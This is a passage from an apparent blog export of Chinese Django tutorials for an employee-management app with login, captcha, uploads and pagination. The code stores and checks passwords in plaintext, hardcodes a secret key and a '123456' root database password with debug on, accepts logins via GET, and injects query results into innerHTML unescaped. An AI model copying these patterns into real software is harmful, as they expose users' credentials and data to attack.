align=&quot;right&quot;&gt; name: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;name&quot; value=&quot;&#123;&#123; staff.name &#125;&#125;&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; salary: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;salary&quot; value=&quot;&#123;&#123; staff.salary &#125;&#125;&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; age: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;age&quot; value=&quot;&#123;&#123; staff.age &#125;&#125;&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; head_pic: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;img src=&quot;&#123;% static staff.head_pic.url %&#125;&quot; alt=&quot;图片加载失败&quot; height=&quot;70px&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;head_pic&quot;&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Confirm&quot;/&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt;&#123;% endblock %&#125; addEmp.html123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&#123;% extends &quot;emsapp/emplist.html&quot; %&#125;&#123;% block content %&#125; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; add Emp info: &lt;/h1&gt; &lt;form action=&quot;&#123;% url &quot;emsapp:addEmp_logic&quot; %&#125;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; name: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;name&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; salary: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;salary&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; age: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;age&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; head_pic: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;file&quot; class=&quot;inputgri&quot; name=&quot;head_pic&quot; /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;submit&quot; class=&quot;button&quot; value=&quot;Confirm&quot; /&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt;&#123;% endblock %&#125; 中间件myMiddleware123456789101112131415161718192021222324252627282930313233# _*_coding:UTF-8 _*_from django.shortcuts import renderfrom django.utils.deprecation import MiddlewareMixinclass MyMiddleware(MiddlewareMixin): # 自定义的中间件 def __init__(self, get_response): # 初始化 super().__init__(get_response) print(&quot;中间件已经初始化完毕&quot;) # view处理请求前执行 def process_request(self, request): # 某一个view if &#x27;login&#x27; not in request.path: is_login = request.session.get(&#x27;login&#x27;) if is_login: pass elif &quot;regist&quot; in request.path: pass elif &quot;getCaptcha&quot; in request.path: pass else: return render(request, &#x27;emsapp/login.html&#x27;) # 在process_request之后View之前执行 def process_view(self, request, view_func, view_args, view_kwargs): print(&quot;view:&quot;, request, view_func, view_args, view_kwargs) # view执行之后，响应之前执行 def process_response(self, request, response): print(&quot;response:&quot;, request, response) return response # 必须返回response # 如果View中抛出了异常 def process_exception(self, request, ex): # View中出现异常时执行 print(&quot;exception:&quot;, request, ex) urls.py1234567891011121314151617181920# _*_coding:UTF-8 _*_from django.urls import pathfrom emsapp import viewsapp_name = &#x27;emsapp&#x27;urlpatterns = [ path(&#x27;login/&#x27;,views.login, name=&#x27;login&#x27; ), path(&#x27;login1/&#x27;,views.login1, name=&#x27;login1&#x27; ), path(&#x27;regist/&#x27;,views.regist, name=&#x27;regist&#x27; ), path(&#x27;addemp/&#x27;,views.addEmp, name=&#x27;addEmp&#x27; ), path(&#x27;updateemp/&#x27;,views.updateEmp, name=&#x27;updateEmp&#x27; ), path(&#x27;delete/&#x27;,views.delete, name=&#x27;delete&#x27; ), path(&#x27;emplist_logic/&#x27;,views.emplist_logic,name=&#x27;emplist_logic&#x27;), path(&#x27;regist_logic/&#x27;,views.regist_logic,name=&#x27;regist_logic&#x27;), path(&#x27;addEmp_logic/&#x27;,views.addEmp_logic,name=&#x27;addEmp_logic&#x27;), path(&#x27;updateEmp_logic/&#x27;,views.updareEmp_logic,name=&#x27;updareEmp_logic&#x27;), path(&#x27;getCaptcha/&#x27;,views.getCaptcha,name=&#x27;getCaptcha&#x27;), path(&#x27;query/&#x27;,views.query,name=&#x27;query&#x27;),] settings.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131&quot;&quot;&quot;Django settings for ems project.Generated by &#x27;django-admin startproject&#x27; using Django 2.0.6.For more information on this file, seehttps://docs.djangoproject.com/en/2.0/topics/settings/For the full list of settings and their values, seehttps://docs.djangoproject.com/en/2.0/ref/settings/&quot;&quot;&quot;import os# Build paths inside the project like this: os.path.join(BASE_DIR, ...)BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))# Quick-start development settings - unsuitable for production# See https://docs.djangoproject.com/en/2.0/howto/deployment/checklist/# SECURITY WARNING: keep the secret key used in production secret!SECRET_KEY = &#x27;f+x_dfajz+9lvvmzvz-6q$f!i9+*&amp;6kxjc+@ql9ubm$2ub7au9&#x27;# SECURITY WARNING: don&#x27;t run with debug turned on in production!DEBUG = TrueALLOWED_HOSTS = []# Application definitionINSTALLED_APPS = [ &#x27;django.contrib.admin&#x27;, &#x27;django.contrib.auth&#x27;, &#x27;django.contrib.contenttypes&#x27;, &#x27;django.contrib.sessions&#x27;, &#x27;django.contrib.messages&#x27;, &#x27;django.contrib.staticfiles&#x27;, &#x27;emsapp&#x27;,]MIDDLEWARE = [ &#x27;django.middleware.security.SecurityMiddleware&#x27;, &#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;, &#x27;django.middleware.common.CommonMiddleware&#x27;, &#x27;django.middleware.csrf.CsrfViewMiddleware&#x27;, &#x27;django.contrib.auth.middleware.AuthenticationMiddleware&#x27;, &#x27;django.contrib.messages.middleware.MessageMiddleware&#x27;, &#x27;django.middleware.clickjacking.XFrameOptionsMiddleware&#x27;, #激活中间件 &#x27;emsapp.myMiddleware.MyMiddleware&#x27;,]ROOT_URLCONF = &#x27;ems.urls&#x27;TEMPLATES = [ &#123; &#x27;BACKEND&#x27;: &#x27;django.template.backends.django.DjangoTemplates&#x27;, &#x27;DIRS&#x27;: [os.path.join(BASE_DIR, &#x27;templates&#x27;)] , &#x27;APP_DIRS&#x27;: True, &#x27;OPTIONS&#x27;: &#123; &#x27;context_processors&#x27;: [ &#x27;django.template.context_processors.debug&#x27;, &#x27;django.template.context_processors.request&#x27;, &#x27;django.contrib.auth.context_processors.auth&#x27;, &#x27;django.contrib.messages.context_processors.messages&#x27;, ], &#125;, &#125;,]WSGI_APPLICATION = &#x27;ems.wsgi.application&#x27;# Database# https://docs.djangoproject.com/en/2.0/ref/settings/#databasesDATABASES = &#123; &#x27;default&#x27;: &#123; &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;, &#x27;NAME&#x27;: &#x27;test&#x27;, &#x27;USER&#x27;: &#x27;root&#x27;, &#x27;HOST&#x27;: &#x27;localhost&#x27;, &#x27;PORT&#x27;: &#x27;3306&#x27;, &#x27;PASSWORD&#x27;: &#x27;123456&#x27; &#125;&#125;# Password validation# https://docs.djangoproject.com/en/2.0/ref/settings/#auth-password-validatorsAUTH_PASSWORD_VALIDATORS = [ &#123; &#x27;NAME&#x27;: &#x27;django.contrib.auth.password_validation.UserAttributeSimilarityValidator&#x27;, &#125;, &#123; &#x27;NAME&#x27;: &#x27;django.contrib.auth.password_validation.MinimumLengthValidator&#x27;, &#125;, &#123; &#x27;NAME&#x27;: &#x27;django.contrib.auth.password_validation.CommonPasswordValidator&#x27;, &#125;, &#123; &#x27;NAME&#x27;: &#x27;django.contrib.auth.password_validation.NumericPasswordValidator&#x27;, &#125;,]# Internationalization# https://docs.djangoproject.com/en/2.0/topics/i18n/LANGUAGE_CODE = &#x27;en-us&#x27;TIME_ZONE = &#x27;UTC&#x27;USE_I18N = TrueUSE_L10N = TrueUSE_TZ = True# Static files (CSS, JavaScript, Images)# https://docs.djangoproject.com/en/2.0/howto/static-files/STATIC_URL = &#x27;/static/&#x27;# STATIC_ROOT=os.path.join(BASE_DIR,&#x27;static&#x27;) #用于nginx收集静态资源时使用SESSION_EXPIRE_AT_BROWSER_CLOSE = TrueMEDIA_ROOT = os.path.join(BASE_DIR,&#x27;media&#x27;)STATICFILES_DIRS = [os.path.join(BASE_DIR,&#x27;static&#x27;),MEDIA_ROOT]","categories":[],"tags":[{"name":"Django","slug":"Django","permalink":"http://example.com/tags/Django/"}]},{"title":"Django-员工操作","slug":"Django-员工操作-1","date":"2020-08-28T00:05:03.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/08/28/Django-员工操作-1/","permalink":"http://example.com/2020/08/28/Django-%E5%91%98%E5%B7%A5%E6%93%8D%E4%BD%9C-1/","excerpt":"Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作,中间件,上传头像,验证码 ,分页显示 新增模糊查询,使用 Jquery-Ajax 新增登陆时只更新部分内容,使用Ajax控制","text":"Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作,中间件,上传头像,验证码 ,分页显示 新增模糊查询,使用 Jquery-Ajax 新增登陆时只更新部分内容,使用Ajax控制 view视图123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126# 注册页面def regist(request): return render(request, &quot;work/regist.html&quot;)# 添加员工页面def addEmp(request): return render(request, &quot;work/addEmp.html&quot;)# 修改员工页面def updateEmp(request): # 填写获取的该员工信息 id = request.GET.get(&#x27;id&#x27;) staff = Staff.objects.get(pk=id) return render(request, &quot;work/updateEmp.html&quot;, &#123;&quot;staff&quot;: staff&#125;)# 登陆逻辑def login_logic(request): if request.method == &quot;GET&quot;: username = request.GET.get(&quot;name&quot;) userpwd = request.GET.get(&quot;pwd&quot;) else: username = request.POST.get(&quot;name&quot;) userpwd = request.POST.get(&quot;pwd&quot;) res = User.objects.filter(username=username, userpwd=userpwd) if res: request.session[&#x27;is_login&#x27;] = True # 登陆正确设置及session会话 return HttpResponse(&#x27;ok&#x27;) return HttpResponse(&#x27;用户名或密码错误&#x27;)# # 模糊查询def query(request): staff = request.GET.get(&quot;query&quot;) res = Staff.objects.filter(name__icontains=staff) print(res) def mydefault(u): if isinstance(u,Staff): return &#123;&#x27;name&#x27;:u.name,&#x27;salary&#x27;:float(u.salary),&#x27;age&#x27;:u.age&#125; return JsonResponse(&#123;&#x27;staff&#x27;:list(res)&#125;,safe=False,json_dumps_params=&#123;&#x27;default&#x27;:mydefault&#125;)# 随机码def getCaptacha(request): image = ImageCaptcha() code = random.sample(string.ascii_lowercase + string.ascii_uppercase + string.digits, 4) random_code = &#x27;&#x27;.join(code) request.session[&#x27;code&#x27;] = random_code data = image.generate(random_code) return HttpResponse(data, &quot;image/png&quot;)# 注册逻辑def regist_logic(request): username = request.POST.get(&quot;username&quot;) name = request.POST.get(&quot;name&quot;) userpwd = request.POST.get(&quot;pwd&quot;) sex = request.POST.get(&quot;sex&quot;) # 获取输入的验证码 captcha = request.POST.get(&#x27;captcha&#x27;) code = request.session.get(&#x27;code&#x27;) if code.lower() == captcha.lower(): res = User.objects.filter(username=username) # 获取数据库是否拥有用户名 if res: return HttpResponse(&quot;用户已存在&quot;) with transaction.atomic(): User.objects.create(username=username, name=name, userpwd=userpwd, sex=sex) return redirect(&quot;work:login&quot;) else: return HttpResponse(&#x27;注册失败&#x27;)# 添加员工逻辑def addEmp_logic(request): # # 判断是否存在session,不存在强制返回登陆界面 # res = request.session.get(&#x27;is_login&#x27;) # if res: # return redirect(&quot;work:emplist_logic&quot;) # 存在session,返回员工页面 name = request.POST.get(&#x27;name&#x27;) salary = request.POST.get(&#x27;salary&#x27;) age = request.POST.get(&#x27;age&#x27;) # 获取上传的头像 pic = request.FILES.get(&#x27;head_pic&#x27;) ext = os.path.splitext(pic.name)[1] # 获取后缀 head_pic = str(uuid.uuid4()) + ext # 拼接后缀名 pic.name = head_pic with transaction.atomic(): Staff.objects.create(name=name, salary=salary, age=age, pic=pic) return redirect(&quot;work:emplist_logic&quot;)# 修改数据逻辑def updateEmp_logic(request): # 根据修改页面的该员工的id id = request.GET.get(&#x27;id&#x27;) print(id) staff = Staff.objects.get(pk=id) # 获取到提交的修改数据 name = request.POST.get(&#x27;name&#x27;) salary = request.POST.get(&#x27;salary&#x27;) age = request.POST.get(&#x27;age&#x27;) # 修改图片 pic = request.FILES.get(&#x27;head_pic&#x27;) ext = os.path.splitext(pic.name)[1] # 获取后缀 head_pic = str(uuid.uuid4()) + ext # 拼接后缀名 pic.name = head_pic # 进行员工的信息修改 with transaction.atomic(): staff.name = name staff.salary = salary staff.age = age staff.pic = pic staff.save() return redirect(&quot;work:emplist&quot;)# 删除员工def delete_logic(request): with transaction.atomic(): id = request.GET.get(&#x27;id&#x27;) staff = Staff.objects.filter(pk=id) staff.delete() return redirect(&#x27;work:emplist&#x27;)# 主页逻辑def emplist_logic(request): # 分页需要导包Paginator num = request.GET.get(&#x27;num&#x27;, 1) paginator = Paginator(Staff.objects.all(), per_page=3) # 每页显示3条数据 page = paginator.page(num) # 构建页面对象 return render(request, &#x27;work/emplist.html&#x27;, &#123;&quot;page&quot;: page&#125;) emplistHtml123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178&#123;% load static %&#125;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;emplist&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;&#123;% static &#x27;work/css/style.css&#x27; %&#125;&quot;/&gt; &lt;script src=&quot;&#123;% static &#x27;work/js/jquery-1.11.1.min.js&#x27; %&#125;&quot;&gt;&lt;/script&gt; &lt;script&gt; function f() &#123; var table = document.getElementById(&#x27;t1&#x27;); var query = document.getElementById(&#x27;s1&#x27;); $.ajax(&#123; type: &#x27;GET&#x27;, url: &#x27;&#123;% url &#x27;work:query&#x27; %&#125;&#x27;, data: &quot;query=&quot; + query.value, success: function (c) &#123; c = c[&#x27;staff&#x27;]; console.log(c); var str = &#x27;&lt;tr&gt;&lt;td&gt;姓名&lt;/td&gt;&lt;td&gt;薪水&lt;/td&gt;&lt;td&gt;年龄&lt;/td&gt;&lt;/tr&gt;&#x27;; for (var i = 0; i &lt; c.length;i++) &#123; str += &quot;&lt;tr&gt;&quot;; str += &quot;&lt;td&gt;&quot;; str += c[i][&#x27;name&#x27;]; str += &quot;&lt;/td&gt;&quot;; str += &quot;&lt;td&gt;&quot;; str += c[i][&#x27;salary&#x27;]; str += &quot;&lt;/td&gt;&quot;; str += &quot;&lt;td&gt;&quot;; str += c[i][&#x27;age&#x27;]; str += &quot;&lt;/td&gt;&quot;; str += &quot;&lt;/tr&gt;&quot;; &#125; table.innerHTML = str &#125; &#125;) &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br/&gt; &lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; Welcome! &lt;/h1&gt; &lt;div&gt; &lt;input type=&quot;text&quot; id=&quot;s1&quot;&gt; &lt;input type=&quot;button&quot; value=&quot;搜索&quot; onclick=&quot;f()&quot;&gt; &lt;/div&gt; &lt;table class=&quot;table&quot; id=&quot;t1&quot;&gt; &lt;tr class=&quot;table_header&quot;&gt; &lt;td&gt; ID &lt;/td&gt; &lt;td&gt; Name &lt;/td&gt; &lt;td&gt; Salary &lt;/td&gt; &lt;td&gt; Age &lt;/td&gt; &lt;td&gt; head_pic &lt;/td&gt; &lt;td&gt; Operation &lt;/td&gt; &lt;/tr&gt; &#123;% for i in page.object_list %&#125; &#123;% if forloop.counter|divisibleby:2 %&#125; &lt;tr class=&quot;row1&quot; style=&quot;background-color: #ffffff&quot;&gt; &lt;td&gt; &#123;&#123; forloop.counter &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.name &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.salary &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.age &#125;&#125; &lt;/td&gt; &lt;td&gt; &lt;img src=&quot;&#123;% static i.pic.url %&#125;&quot; alt=&quot;图片加载失败&quot; height=&quot;70px&quot;&gt; &lt;/td&gt; &lt;td&gt; &lt;a href=&quot;&#123;% url &quot;work:delete_logic&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;delete emp&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;&#123;% url &quot;work:updateemp&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;update emp&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &#123;% else %&#125; &lt;tr class=&quot;row2&quot; style=&quot;background-color: #eeeeee&quot;&gt; &lt;td&gt; &#123;&#123; forloop.counter &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.name &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.salary &#125;&#125; &lt;/td&gt; &lt;td&gt; &#123;&#123; i.age &#125;&#125; &lt;/td&gt; &lt;td&gt; &lt;img src=&quot;&#123;% static i.pic.url %&#125;&quot; alt=&quot;图片加载失败&quot; height=&quot;70px&quot;&gt; &lt;/td&gt; &lt;td&gt; &lt;a href=&quot;&#123;% url &quot;work:delete_logic&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;delete emp&lt;/a&gt;&amp;nbsp;&lt;a href=&quot;&#123;% url &quot;work:updateemp&quot; %&#125;?id=&#123;&#123; i.id &#125;&#125;&quot;&gt;update emp&lt;/a&gt; &lt;/td&gt; &lt;/tr&gt; &#123;% endif %&#125; &#123;% endfor %&#125; &lt;/table&gt; &#123;% if page.has_previous %&#125; &lt;a href=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;?num=&#123;&#123; page.previous_page_number &#125;&#125;&quot;&gt; 上一页&lt;/a&gt; &#123;% endif %&#125; &#123;% for foo in page.paginator.page_range %&#125; &lt;a href=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;?num=&#123;&#123; foo &#125;&#125;&quot;&gt; &#123;% if foo == page.number %&#125; &lt;span class=&quot;b&quot;&gt;&#123;&#123; foo &#125;&#125;&lt;/span&gt; &#123;% else %&#125; &lt;span class=&quot;a&quot;&gt;&#123;&#123; foo &#125;&#125;&lt;/span&gt; &#123;% endif %&#125; &lt;/a&gt; &#123;% endfor %&#125; &#123;% if page.has_next %&#125; &lt;a href=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;?num=&#123;&#123; page.next_page_number &#125;&#125;&quot;&gt; 下一页&lt;/a&gt; &#123;% endif %&#125; &#123;% if not page.paginator.num_pages == page.number %&#125; &lt;a href=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;?num=&#123;&#123; page.paginator.num_pages &#125;&#125;&quot;&gt;尾页&lt;/a&gt; &#123;% endif %&#125; &lt;form action=&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;&quot; method=&quot;get&quot;&gt; 输入页号&lt;input type=&quot;text&quot; name=&quot;num&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;跳转&quot;&gt; &lt;p&gt; &lt;input type=&quot;button&quot; class=&quot;button&quot; value=&quot;Add Employee&quot; onclick=&quot;location=&#x27;&#123;% url &quot;work:addemp&quot; %&#125;&#x27;&quot;/&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; login.html1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495&#123;% load static %&#125;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;login&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;/static/work/css/style.css&quot;/&gt; &lt;script&gt; function f1() &#123; var name = document.getElementById(&quot;name&quot;).value; var pwd = document.getElementById(&quot;pwd&quot;).value; var s1 = document.getElementById(&quot;s1&quot;); var xml = new XMLHttpRequest(); xml.open(&#x27;POST&#x27;, &#x27;&#123;% url &#x27;work:login_logic&#x27; %&#125;&#x27;, true); xml.setRequestHeader(&quot;Content-type&quot;, &#x27;application/x-www-form-urlencoded&#x27;); xml.send(&#x27;name=&#x27; + name + &#x27;&amp;pwd=&#x27; + pwd + &#x27;&amp;csrfmiddlewaretoken=&#123;&#123; csrf_token &#125;&#125;&#x27;); &#123;#回调函数#&#125; xml.onreadystatechange = function () &#123; if (xml.readyState == 4 &amp;&amp; xml.status == 200) &#123; var text = xml.responseText; console.log(text); if (text == &#x27;ok&#x27;) &#123; &#123;#s1.innerHTML = text;#&#125; location.href =&quot;&#123;% url &#x27;work:emplist_logic&#x27; %&#125;&quot; &#125; else &#123; s1.innerHTML = text; document.getElementById(&quot;pwd&quot;).value = &#x27;&#x27;; &#125; &#125; &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;wrap&quot;&gt; &lt;div id=&quot;top_content&quot;&gt; &lt;div id=&quot;header&quot;&gt; &lt;div id=&quot;rightheader&quot;&gt; &lt;p&gt; 2009/11/20 &lt;br/&gt; &lt;/p&gt; &lt;/div&gt; &lt;div id=&quot;topheader&quot;&gt; &lt;h1 id=&quot;title&quot;&gt; &lt;a href=&quot;#&quot;&gt;main&lt;/a&gt; &lt;/h1&gt; &lt;/div&gt; &lt;div id=&quot;navigation&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;content&quot;&gt; &lt;p id=&quot;whereami&quot;&gt; &lt;/p&gt; &lt;h1&gt; login &lt;/h1&gt; &lt;form action=&quot;&#123;% url &quot;work:login_logic&quot; %&#125;&quot; method=&quot;post&quot; enctype=&quot;application/x-www-form-urlencoded&quot;&gt; &#123;% csrf_token %&#125; &lt;table cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; border=&quot;0&quot; class=&quot;form_table&quot;&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; username: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;inputgri&quot; name=&quot;name&quot; id=&quot;name&quot;/&gt; &lt;span id=&quot;s1&quot;&gt;&lt;/span&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td valign=&quot;middle&quot; align=&quot;right&quot;&gt; password: &lt;/td&gt; &lt;td valign=&quot;middle&quot; align=&quot;left&quot;&gt; &lt;input type=&quot;password&quot; class=&quot;inputgri&quot; name=&quot;pwd&quot; id=&quot;pwd&quot;/&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt; &lt;input type=&quot;button&quot; onclick=&quot;f1()&quot; class=&quot;button&quot; value=&quot;Submit &amp;raquo;&quot;/&gt; &lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;footer&quot;&gt; &lt;div id=&quot;footer_bg&quot;&gt; ABC@126.com &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;","categories":[],"tags":[{"name":"Django","slug":"Django","permalink":"http://example.com/tags/Django/"}]},{"title":"Django-员工操作","slug":"Django-员工操作","date":"2020-08-25T02:33:37.000Z","updated":"2022-04-08T14:29:40.234Z","comments":true,"path":"2020/08/25/Django-员工操作/","permalink":"http://example.com/2020/08/25/Django-%E5%91%98%E5%B7%A5%E6%93%8D%E4%BD%9C/","excerpt":"Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作 新增中间件,上传头像,验证码 ,分页显示","text":"Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作 新增中间件,上传头像,验证码 ,分页显示 Django员工操作Django实现用户登陆,注册,以及session会话强制登陆,以及对员工的信息的增加,删除,修改操作 新增中间件,上传头像,验证码 ,分页显示views123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131import os, uuidfrom django.db import transactionfrom django.http import HttpResponsefrom django.shortcuts import render, redirectfrom work.models import User, Staffimport random, stringfrom captcha.image import ImageCaptchafrom django.core.paginator import Paginator# 主页面def emplist(request): return redirect(&quot;work:emplist_logic&quot;) # 存在session,返回员# 登陆页面def login(request): return render(request, &quot;work/login.html&quot;) # 密码错误.返回登陆页面重新登陆# 注册页面def regist(request): return render(request, &quot;work/regist.html&quot;)# 添加员工页面def addEmp(request): return render(request, &quot;work/addEmp.html&quot;)# 修改员工页面def updateEmp(request): # 填写获取的该员工信息 id = request.GET.get(&#x27;id&#x27;) staff = Staff.objects.get(pk=id) return render(request, &quot;work/updateEmp.html&quot;, &#123;&quot;staff&quot;: staff&#125;)# 登陆逻辑def login_logic(request): username = request.POST.get(&quot;name&quot;) userpwd = request.POST.get(&quot;pwd&quot;) res = User.objects.filter(username=username, userpwd=userpwd) if res: request.session[&#x27;is_login&#x27;] = True # 登陆正确设置及session会话 return redirect(&quot;work:emplist&quot;) # 重定向到员工页面 return redirect(&quot;work:login&quot;) # 密码错误,返回登陆页面重新登陆# 随机码def getCaptacha(request): image = ImageCaptcha() code = random.sample(string.ascii_lowercase + string.ascii_uppercase + string.digits, 4) random_code = &#x27;&#x27;.join(code) request.session[&#x27;code&#x27;] = random_code data = image.generate(random_code) return HttpResponse(data, &quot;image/png&quot;)# 注册逻辑def regist_logic(request): username = request.POST.get(&quot;username&quot;) name = request.POST.get(&quot;name&quot;) userpwd = request.POST.get(&quot;pwd&quot;) sex = request.POST.get(&quot;sex&quot;) # 获取输入的验证码 captcha = request.POST.get(&#x27;captcha&#x27;) code = request.session.get(&#x27;code&#x27;) if code.lower() == captcha.lower(): res = User.objects.filter(username=username) # 获取数据库是否拥有用户名 if res: return HttpResponse(&quot;用户已存在&quot;) with transaction.atomic(): User.objects.create(username=username, name=name, userpwd=userpwd, sex=sex) return redirect(&quot;work:login&quot;) else: return HttpResponse(&#x27;注册失败&#x27;)# 添加员工逻辑def addEmp_logic(request): # 判断是否存在session,不存在强制返回登陆界面 res = request.session.get(&#x27;is_login&#x27;) if res: return redirect(&quot;work:emplist_logic&quot;) # 存在session,返回员工页面 name = request.POST.get(&#x27;name&#x27;) salary = request.POST.get(&#x27;salary&#x27;) age = request.POST.get(&#x27;age&#x27;) # 获取上传的头像 pic = 